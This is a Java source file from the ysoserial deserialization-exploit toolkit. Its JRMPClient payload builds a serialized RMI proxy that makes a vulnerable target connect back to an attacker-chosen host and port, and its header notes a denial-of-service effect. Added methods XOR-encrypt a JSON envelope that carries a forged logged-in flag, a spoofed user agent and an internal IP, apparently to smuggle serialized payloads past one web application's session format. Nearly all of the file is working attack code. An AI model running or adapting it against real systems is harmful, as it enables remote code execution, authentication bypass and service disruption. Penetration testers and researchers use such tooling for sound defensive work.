package ysoserial.payloads;


import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Base64;
import java.util.Random;

import java.util.UUID;
import org.apache.shiro.crypto.CryptoException;
import org.apache.shiro.crypto.hash.Md5Hash;
import org.apache.shiro.crypto.hash.Sha1Hash;
import org.apache.shiro.util.ByteSource;
import org.json.JSONObject;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;


/**
 *
 *
 * UnicastRef.newCall(RemoteObject, Operation[], int, long)
 * DGCImpl_Stub.dirty(ObjID[], long, Lease)
 * DGCClient$EndpointEntry.makeDirtyCall(Set<RefEntry>, long)
 * DGCClient$EndpointEntry.registerRefs(List<LiveRef>)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 *
 * Thread.start()
 * DGCClient$EndpointEntry.<init>(Endpoint)
 * DGCClient$EndpointEntry.lookup(Endpoint)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 *
 * Requires:
 * - JavaSE
 *
 * Argument:
 * - host:port to connect to, host only chooses random port (DOS if repeated many times)
 *
 * Yields:
 * * an established JRMP connection to the endpoint (if reachable)
 * * a connected RMI Registry proxy
 * * one system thread per endpoint (DOS)
 *
 * @author mbechler
 */
@SuppressWarnings ( {
    "restriction"
} )
@PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
@Authors({ Authors.MBECHLER })
public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry> {

    public Registry getObject ( final String command ) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
            Registry.class
        }, obj);
        return proxy;
    }


    public static void main(final String[] args1) throws Exception {
        String[] args = new String[]{"127.0.0.1:9999"};
        PayloadRunner.runDeserialize = true;
        PayloadRunner.run(JRMPClient.class, args);
    }


    public static ByteSource decrypt(byte[] ciphertext, byte[] key)
        throws CryptoException {
        String skey = new Sha1Hash(new String(key)).toString();
        byte[] bkey = skey.getBytes();
        byte[] data_bytes = new byte[ciphertext.length];
        for (int i = 0; i < ciphertext.length; i++) {
            data_bytes[i] = ((byte) (ciphertext[i] ^ bkey[(i % bkey.length)]));
        }
        byte[] jsonData = new byte[ciphertext.length / 2];
        for (int i = 0; i < jsonData.length; i++) {
            jsonData[i] = ((byte) (data_bytes[(i * 2)] ^ data_bytes[(i * 2 + 1)]));
        }
        System.out.println(new String(jsonData));
        JSONObject jsonObject = new JSONObject(new String(jsonData));
        String serial = (String) jsonObject.get("serialize_data");
        return ByteSource.Util.bytes(Base64.getDecoder().decode(serial));
    }

    public static ByteSource encrypt(byte[] plaintext, byte[] key)
        throws CryptoException {
        String sign = new Md5Hash(UUID.randomUUID().toString()).toString() + "asfda-92u134-";
        String user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36";
        String ip_address = "10.10.18.210";
        String data =
            "{\"user_is_login\":\"1\",\"sign\":\"" + sign + "\",\"ip_address\":\"" + ip_address
                + "\",\"user_agent\":\"" + user_agent + "\",\"serialize_data\":\"" + Base64
                .getEncoder()
                .encodeToString(plaintext) + "\"}";
        byte[] data_bytes = data.getBytes();
        byte[] okey = new Sha1Hash(new String(key)).toString().getBytes();
        byte[] mkey = new Sha1Hash(UUID.randomUUID().toString()).toString().getBytes();
        byte[] out = new byte[2 * data_bytes.length];
        for (int i = 0; i < data_bytes.length; i++) {
            out[(i * 2)] = mkey[(i % mkey.length)];
            out[(i * 2 + 1)] = ((byte) (mkey[(i % mkey.length)] ^ data_bytes[i]));
        }
        byte[] result = new byte[out.length];
        for (int i = 0; i < out.length; i++) {
            result[i] = ((byte) (out[i] ^ okey[(i % okey.length)]));
        }
        return ByteSource.Util.bytes(result);
    }

}
